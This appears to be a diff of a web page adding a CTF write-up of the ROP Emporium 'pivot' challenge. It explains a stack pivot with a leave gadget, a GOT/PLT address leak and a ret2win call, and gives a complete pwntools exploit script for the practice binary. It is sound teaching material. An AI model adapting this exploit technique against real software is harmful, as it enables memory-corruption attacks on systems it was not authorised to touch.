@@ -1,14 +1,115 @@
 <div class="page-header">
     <div class="page-header-inner">
         <div class="page-header-inner2">
-            <h1>Rop-Emporium - Pivot</h1>
+            <h1>Pivot Writeup</h1>
+            <h2>May 2021</h2>           
+            <h4>Stack Pivot + Got Leak + Ret2win</h4>           
         </div>
     </div>
 </div>
+<H4>Problem</H4>
 <div class="paragraph">
-    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Distinctio excepturi asperiores voluptate quisquam! Temporibus minus esse obcaecati recusandae exercitationem quam adipisci laboriosam veniam, est molestiae reiciendis at, nobis autem soluta?</p>
+    <p>
+        Stack space is at a premium in this challenge and you'll have to pivot the stack onto a second 
+		ROP chain elsewhere in memory to ensure your success. <a href=../../docs/rop_emporium/pivot>pivot</a> <a href=../../docs/rop_emporium/libpivot.so>pivot</a>
+    	<br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally.
+		<br>
+		When running the given binary, we are prompted for input on two different occasions. Then the address of the location where our first input is stored is printed 
+		out. The first input is saved on the heap, and is not vulnerable to an overflow. The second input however gives us an overflow of 24 bytes. Given the name of the 
+		challenge the intended solution appears to be to save a rop chain to the first input, and then use the second input to redirect execution to gadgets that allow us to
+		pivot the stack to our rop chain. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/pivot1.png" alt="">
 </div>
 <div class="paragraph">
-    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Laudantium inventore vel ut, a eum harum. Aliquam est hic maxime, temporibus neque minima optio, quia alias sequi non dolores distinctio dolore?</p>
+    <p>
+    	<br><br>
+		The binary gives us some helper functions with multiple useful gadgets to achieve this stack pivot, however I chose to go with a more realistic way that does not
+		make use of the special gadgets provided. This method also only requires 8 bytes of space, which is more than enough considering we have 24 bytes. The leave gadget
+		basically executes 'pop rbp ; mov rsp, rbp'. Since we overwrite the contents of the rbp register using our 40 byte padding towards code execution, we can overwrite
+		it with our leaked pivot address and execute the leave gadget to pivot the stack to our chain.
+		<br>
+		Now that we have a much larger buffer to work with, we need to decide how we want to get the flag. Looking through the provided library, we find a ret2win function
+		that prints out the flag when called. This sounds like an easy target. 
+		before we can call ret2win. 
+    	<br><br>
+    </p>
 </div>
+<div>
+    <img src="../imgs/rop_emporium/pivot2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+    	<br><br>
+		We know our target, however we do not yet have a valid address from our libraries, so we will need another leak. Since the binary does not have pie enabled, we have
+		access to the plt and got table addresses. We can use this to our advantage and call Puts_plt with puts_got as the argument to leak out the address of puts_got. We 
+		can then use this leak to find the address of the ret2win function since from here on out, everything is at a set offset from our leak. <br>
+		Finally we just need a way to trigger the vulnerability again to redirect code execution to the ret2win function. This can be done by just calling main at the 
+		end of our chain, and redirecting execution to ret2win. <br>
+		Executing our script gives us the flag. The full exploit is posted below. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/rop_emporium/pivot3.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./pivot')
+
+p = elf.process()
+
+p.recvuntil('pivot: ')
+leak = int(p.recvuntil('\n').strip(),16)    #Get Address of chain location in memory
+
+PUTS_PLT = p64(elf.plt['puts'])
+PUTS_GOT = p64(elf.got['puts'])
+pop_rdi = p64(0x400a33)
+main = p64(elf.sym['main'])
+leave = p64(0x4008ef)
+
+chain = b'A'*8 + pop_rdi + PUTS_GOT + PUTS_PLT + main   #Leak an address from libc using puts_plt. This gives us ret2win address
+                                                        #Finally call main again so that we can abuse the buffer overflow again
+pivot = b'A'*32 + p64(leak) + leave                     #Stack pivot onto chain using the chain leak, and a leave gadget
+
+p.sendlineafter('> ',chain)
+p.sendlineafter('> ',pivot)
+
+p.recvuntil('Thank you!\n')
+data = p.recvline().strip()
+libc_leak = u64(data.ljust(8,b'\x00'))
+libc_base = libc_leak + 0x184a60
+ret2win = p64(libc_base + 0xa81)                      #Calculate address of ret2win
+
+p.sendlineafter('> ',b'AAAA')
+p.sendlineafter('> ',b'A'*40 + ret2win)               #Call ret2win to write out the flag
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
